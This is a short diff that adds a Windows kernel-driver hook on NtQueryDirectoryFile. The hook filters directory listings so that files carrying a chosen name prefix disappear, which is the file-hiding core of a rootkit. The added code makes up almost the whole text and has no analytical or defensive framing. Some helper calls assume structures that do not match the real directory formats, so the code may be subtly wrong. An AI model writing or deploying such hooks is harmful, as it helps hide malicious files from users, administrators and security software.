@@ -175,3 +175,66 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
     
     return STATUS_SUCCESS;
 }
+
+// Hooking function to hide files
+NTSTATUS HookedNtQueryDirectoryFile(
+    HANDLE FileHandle,
+    HANDLE Event,
+    PIO_APC_ROUTINE ApcRoutine,
+    PVOID ApcContext,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PVOID FileInformation,
+    ULONG Length,
+    FILE_INFORMATION_CLASS FileInformationClass,
+    BOOLEAN ReturnSingleEntry,
+    PUNICODE_STRING FileName,
+    BOOLEAN RestartScan)
+{
+    // Call the original function
+    NTSTATUS status = g_OriginalNtQueryDirectoryFile(
+        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
+        FileInformation, Length, FileInformationClass,
+        ReturnSingleEntry, FileName, RestartScan);
+    
+    // If the call succeeded, filter the results
+    if (NT_SUCCESS(status))
+    {
+        // Check prefix to hide files
+        if (FileInformationClass == FileDirectoryInformation ||
+            FileInformationClass == FileFullDirectoryInformation ||
+            FileInformationClass == FileBothDirectoryInformation ||
+            FileInformationClass == FileNamesInformation)
+        {
+            // Traverse file entries
+            PVOID currentEntry = FileInformation;
+            PVOID previousEntry = NULL;
+            
+            while (currentEntry != NULL)
+            {
+                // Get filename
+                PUNICODE_STRING fileName = GetFileNameFromEntry(currentEntry, FileInformationClass);
+                
+                // Check if filename contains hidden prefix
+                if (fileName != NULL && ContainsHiddenPrefix(fileName))
+                {
+                    // Hide entry by modifying list pointers
+                    ModifyDirectoryEntryList(FileInformation, previousEntry, currentEntry, FileInformationClass);
+                }
+                else
+                {
+                    previousEntry = currentEntry;
+                }
+                
+                // Move to next entry
+                ULONG nextEntryOffset = GetNextEntryOffset(currentEntry, FileInformationClass);
+                if (nextEntryOffset == 0)
+                    break;
+                    
+                currentEntry = (PVOID)((ULONG_PTR)currentEntry + nextEntryOffset);
+            }
+        }
+    }
+    
+    return status;
+}
+```
